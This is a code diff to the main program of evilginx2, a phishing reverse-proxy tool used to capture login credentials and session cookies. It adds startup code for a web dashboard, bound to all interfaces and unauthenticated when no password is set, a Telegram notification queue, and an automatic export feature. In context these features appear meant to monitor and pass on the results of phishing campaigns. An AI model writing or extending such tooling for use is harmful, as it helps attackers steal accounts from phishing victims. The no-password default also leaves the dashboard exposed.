@@ -8,14 +8,15 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	
 
 	"github.com/caddyserver/certmagic"
+	"github.com/fatih/color"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"go.uber.org/zap"
-
-	"github.com/fatih/color"
+	
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
@@ -24,6 +25,11 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+
+// Dashboard flags
+var dashboard_addr = flag.String("dashboard", "0.0.0.0:5000", "Dashboard listen address (set empty to disable)")
+var dashboard_user = flag.String("dashboard-user", "admin", "Dashboard username")
+var dashboard_pass = flag.String("dashboard-pass", "", "Dashboard password (empty = no auth)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -173,11 +179,51 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
 
+	// Start the Telegram notification queue
+	core.GetTelegramQueue().Start()
+	defer core.GetTelegramQueue().Stop()
+
+	// Initialize and start the web dashboard
+	dashboardEnabled := *dashboard_addr != ""
+	var dashboardCfg *core.DashboardConfig
+	if dashboardEnabled {
+		dashboardCfg = &core.DashboardConfig{
+			Enabled:     true,
+			BindAddress: *dashboard_addr,
+			Username:    *dashboard_user,
+			Password:    *dashboard_pass,
+		}
+	} else {
+		dashboardCfg = &core.DashboardConfig{
+			Enabled: false,
+		}
+	}
+
+	dashboardServer, err := core.NewDashboardServer(dashboardCfg, db)
+	if err != nil {
+		log.Warning("dashboard: failed to initialize: %v", err)
+	} else {
+		if err := dashboardServer.Start(); err != nil {
+			log.Warning("dashboard: failed to start: %v", err)
+		}
+	}
+
+	// Start the auto-export system (if configured)
+	autoExportCfg := core.GetAutoExportConfig()
+	log.Debug("autoexport: enabled=%v format=%s path=%s", autoExportCfg.Enabled, autoExportCfg.Format, autoExportCfg.Path)
+
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
 		log.Fatal("%v", err)
 		return
 	}
+
+	// When terminal exits, stop the dashboard
+	defer func() {
+		if dashboardServer != nil {
+			dashboardServer.Stop()
+		}
+	}()
 
 	t.DoWork()
 }
